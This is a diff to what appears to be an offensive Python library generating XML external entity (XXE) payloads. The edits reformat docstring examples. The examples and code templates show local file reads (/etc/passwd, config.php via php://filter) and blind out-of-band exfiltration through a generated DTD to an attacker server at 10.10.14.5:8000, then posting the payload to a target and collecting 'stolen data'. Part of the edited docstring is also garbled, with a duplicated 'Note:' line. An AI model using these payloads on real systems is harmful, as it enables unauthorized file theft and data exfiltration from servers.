@@ -72,8 +72,10 @@ def basic_file_read(file_path: str = "/etc/passwd", entity_name: str = "xxe") ->
         Simple XXE payload - file content appears in response
 
     Examples:
-        ... payload = basic_file_read("/etc/passwd")
-        >>> # If vulnerable, response will contain passwd file
+        .. code-block:: python
+
+            payload = basic_file_read("/etc/passwd")
+            # If vulnerable, response will contain passwd file
     """
     return f'''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY {entity_name} SYSTEM "file://{file_path}">]>
@@ -101,8 +103,10 @@ def blind_oob(base_url: str, file_path: str = "/etc/passwd", dtd_path: str = "xx
         XML payload to send to the vulnerable target
 
     Examples:
-        ... payload = blind_oob("http://10.10.14.5:8000")
-        >>> # Send this payload to the target's XML endpoint
+        .. code-block:: python
+
+            payload = blind_oob("http://10.10.14.5:8000")
+            # Send this payload to the target's XML endpoint
     """
     dtd_url = _normalize_url(base_url, dtd_path)
     return f'''<?xml version="1.0" encoding="UTF-8"?>
@@ -129,13 +133,15 @@ def oob_dtd(base_url: str, file_path: str = "/etc/passwd", filename: str = "xxe.
         Relative path where DTD was written (e.g., "xxe/xxe.dtd")
 
     Examples:
-        >>> # Automatically writes to payloads/xxe/xxe.dtd
-        >>> dtd_path = oob_dtd("http://10.10.14.5:8000", "/etc/passwd")
-        >>> # DTD is now ready to be served!
+    Note:
+    Note:
+        .. code-block:: python
 
-    Note:
-    Note:
-        &#x25; is XML entity for % - prevents premature parsing
+            # Automatically writes to payloads/xxe/xxe.dtd
+            dtd_path = oob_dtd("http://10.10.14.5:8000", "/etc/passwd")
+            # DTD is now ready to be served!
+            
+            &#x25; is XML entity for % - prevents premature parsing
     """
     # Generate the DTD content
     exfil_url = _normalize_url(base_url, "queue")
@@ -170,8 +176,10 @@ def parameter_entity(base_url: str, file_path: str = "/etc/passwd") -> str:
         Self-contained XXE payload with embedded DTD
 
     Examples:
-        ... payload = parameter_entity("http://10.10.14.5:8000")
-        >>> # One payload does everything - no DTD file needed!
+        .. code-block:: python
+
+            payload = parameter_entity("http://10.10.14.5:8000")
+            # One payload does everything - no DTD file needed!
     """
     exfil_url = _normalize_url(base_url, "queue")
     return f'''<?xml version="1.0" encoding="UTF-8"?>
@@ -212,9 +220,11 @@ def php_filter_b64(file_path: str = "/etc/passwd") -> str:
         XXE payload using PHP filter wrapper
 
     Examples:
-        ... payload = php_filter_b64("/var/www/config.php")
-        >>> # Response will contain base64 encoded file
-        >>> # Decode with: base64.b64decode(response_text)
+        .. code-block:: python
+
+            payload = php_filter_b64("/var/www/config.php")
+            # Response will contain base64 encoded file
+            # Decode with: base64.b64decode(response_text)
     """
     return f'''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={file_path}">]>
@@ -333,16 +343,18 @@ def generate_oob_files(base_url: str, file_path: str = "/etc/passwd") -> tuple[s
         - dtd_file_path: Automatically served from your server
 
     Examples:
-        >>> # Generate everything
-        >>> xxe, dtd = generate_oob_files("http://10.10.14.5:8000")
+        .. code-block:: python
 
-        >>> # Read and send the XXE payload
-        >>> with open(f"payloads/{xxe}") as f:
-        ...     payload = f.read()
-        >>> requests.post("http://target/api", data=payload)
-
-        >>> # Get the stolen data
-        >>> data = get_exfil()
+            # Generate everything
+            xxe, dtd = generate_oob_files("http://10.10.14.5:8000")
+            
+            # Read and send the XXE payload
+            with open(f"payloads/{xxe}") as f:
+                payload = f.read()
+            requests.post("http://target/api", data=payload)
+            
+            # Get the stolen data
+            data = get_exfil()
     """
     # Generate and write the DTD (automatically writes to disk)
     dtd_file = oob_dtd(base_url, file_path)
@@ -371,14 +383,16 @@ def quick_test(base_url: str, file_path: str = "/etc/passwd") -> str:
         XXE payload string to send to target
 
     Examples:
-        >>> # One function does everything!
-        >>> payload = quick_test("http://10.10.14.5:8000")
+        .. code-block:: python
 
-        >>> # DTD is written, payload is ready - just send it:
-        ... requests.post("http://target/api", data=payload)
-
-        >>> # Get the result:
-        ... print(get_exfil())
+            # One function does everything!
+            payload = quick_test("http://10.10.14.5:8000")
+            
+            # DTD is written, payload is ready - just send it:
+            requests.post("http://target/api", data=payload)
+            
+            # Get the result:
+            print(get_exfil())
     """
     # Write the DTD file automatically
     oob_dtd(base_url, file_path)
